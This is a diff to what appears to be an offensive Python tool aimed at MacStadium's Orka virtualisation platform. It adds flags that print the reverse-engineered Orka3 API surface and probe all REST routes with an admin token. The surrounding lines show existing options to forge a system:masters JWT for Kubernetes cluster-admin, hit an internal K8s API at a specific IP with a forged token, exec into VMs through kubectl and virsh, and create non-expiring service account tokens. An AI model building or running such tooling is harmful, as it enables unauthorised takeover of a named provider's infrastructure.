@@ -188,6 +188,15 @@ except ImportError:
     orka_oidc_run = None
 
 try:
+    from orka_api_surface_re import (
+        probe_all_routes, get_api_surface_findings, ORKA_ROUTES,
+    )
+    HAS_ORKA_SURFACE = True
+except ImportError:
+    HAS_ORKA_SURFACE = False
+    probe_all_routes = None
+
+try:
     from orka_vm_exec_re import (
         list_vms, probe_vm_exec_surface,
         build_k8s_exec_cmd, exec_virsh_via_kubectl, build_virsh_chain,
@@ -909,6 +918,9 @@ def main():
     parser.add_argument('--forge-masters', action='store_true', help='Forge system:masters JWT for K8s cluster-admin')
     parser.add_argument('--orka-k8s', metavar='PATH', default='/api/v1/namespaces', help='Probe K8s API at 10.221.188.19:6443 with forged token')
     parser.add_argument('--oidc-discovery', action='store_true', help='Probe idp.macstadium.com OIDC discovery paths')
+    # orka_api_surface_re flags
+    parser.add_argument('--orka-api-surface', action='store_true', help='Print full Orka3 API surface (binary RE)')
+    parser.add_argument('--orka-api-probe', action='store_true', help='Probe all Orka REST API routes with admin token')
     # orka_vm_exec_re flags
     parser.add_argument('--orka-vm-exec', action='store_true', help='Orka3 VM execution RE: confirmed K8s pod exec path (orka-vm container)')
     parser.add_argument('--orka-sa-token', action='store_true', help='Create persistent K8s SA token (expirationSeconds: null)')
@@ -1330,6 +1342,23 @@ def main():
         else:
             print("[*] Probing idp.macstadium.com OIDC discovery...")
             result = probe_oidc_discovery()
+            print(json.dumps(result, indent=2, default=str))
+
+    elif getattr(args, 'orka_api_surface', False):
+        ablation.banner()
+        if not HAS_ORKA_SURFACE:
+            print("[-] orka_api_surface_re module not available")
+        else:
+            findings = get_api_surface_findings()
+            print(json.dumps(findings, indent=2, default=str))
+
+    elif getattr(args, 'orka_api_probe', False):
+        ablation.banner()
+        if not HAS_ORKA_SURFACE:
+            print("[-] orka_api_surface_re module not available")
+        else:
+            print("[*] Probing all Orka REST API routes (fill ADMIN_TOKEN in orka_api_surface_re.py)")
+            result = probe_all_routes()
             print(json.dumps(result, indent=2, default=str))
 
     elif getattr(args, 'orka_vm_exec', False):
